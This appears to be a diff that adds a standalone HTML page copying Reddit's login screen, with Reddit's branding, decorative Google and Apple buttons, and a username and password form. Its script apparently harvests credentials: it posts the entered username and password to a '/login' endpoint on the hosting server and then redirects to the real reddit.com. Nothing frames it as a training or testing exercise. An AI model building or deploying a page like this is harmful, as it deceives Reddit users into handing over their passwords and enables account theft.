@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reddit - Dive into anything</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
+            margin: 0;
+            display: flex;
+            height: 100vh;
+        }
+        .art-side {
+            background-image: url('https://www.redditstatic.com/accountmanager/d26b88950663.png');
+            background-size: cover;
+            background-position: center;
+            width: 140px;
+            height: 100%;
+        }
+        .container {
+            flex: 1;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding-left: 40px;
+        }
+        .logo {
+            margin-bottom: 24px;
+        }
+        .logo img {
+            height: 32px;
+        }
+        h1 {
+            font-size: 18px;
+            font-weight: 500;
+            line-height: 22px;
+            margin-bottom: 8px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 18px;
+            margin-bottom: 24px;
+        }
+        .auth-buttons {
+            display: flex;
+            flex-direction: column;
+            width: 280px;
+        }
+        .auth-btn {
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            padding: 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .auth-btn:hover {
+            background-color: #f6f7f8;
+            border-color: #dadce0;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            width: 280px;
+        }
+        .divider span {
+            color: #878a8c;
+            font-size: 14px;
+            margin: 0 16px;
+            text-transform: uppercase;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-top: 1px solid #edeff1;
+        }
+        input {
+            width: 280px;
+            padding: 22px 12px 10px;
+            border: 1px solid #edeff1;
+            border-radius: 4px;
+            background-color: #f6f7f8;
+            font-size: 14px;
+            box-sizing: border-box;
+            height: 48px;
+            margin-bottom: 8px;
+            transition: all 0.2s ease-in-out;
+        }
+        input:focus {
+            background-color: #fff;
+            border-color: #0079d3;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #d93a00;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            padding: 10px;
+            width: 280px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 16px;
+            text-transform: uppercase;
+        }
+        .login-btn:hover {
+            background-color: #c13400;
+        }
+        .footer {
+            margin-top: auto;
+            font-size: 12px;
+            color: #1a1a1b;
+        }
+        .footer a {
+            color: #0079d3;
+            text-decoration: none;
+            font-weight: 700;
+        }
+    </style>
+    <script>
+        async function handleLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    window.location.href = "https://www.reddit.com";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="art-side"></div>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/b/bd/Reddit_Logo_Icon.svg/500px-Reddit_Logo_Icon.svg.png" alt="Reddit">
+        </div>
+        <h1>Log in</h1>
+        <p>By continuing, you agree to our User Agreement and Privacy Policy.</p>
+        
+        <div class="auth-buttons">
+            <button class="auth-btn">Continue with Google</button>
+            <button class="auth-btn">Continue with Apple</button>
+        </div>
+        
+        <div class="divider">
+            <span>or</span>
+        </div>
+        
+        <form id="login-form" onsubmit="handleLogin(event)">
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        
+        <p style="margin-top: 24px;">
+            Forgot your <a href="#" style="color: #0079d3; text-decoration: none;">username</a> or <a href="#" style="color: #0079d3; text-decoration: none;">password</a>?
+        </p>
+        
+        <p>
+            New to Reddit? <a href="#" style="color: #0079d3; text-decoration: none; font-weight: 700;">Sign Up</a>
+        </p>
+    </div>
+</body>
+</html>
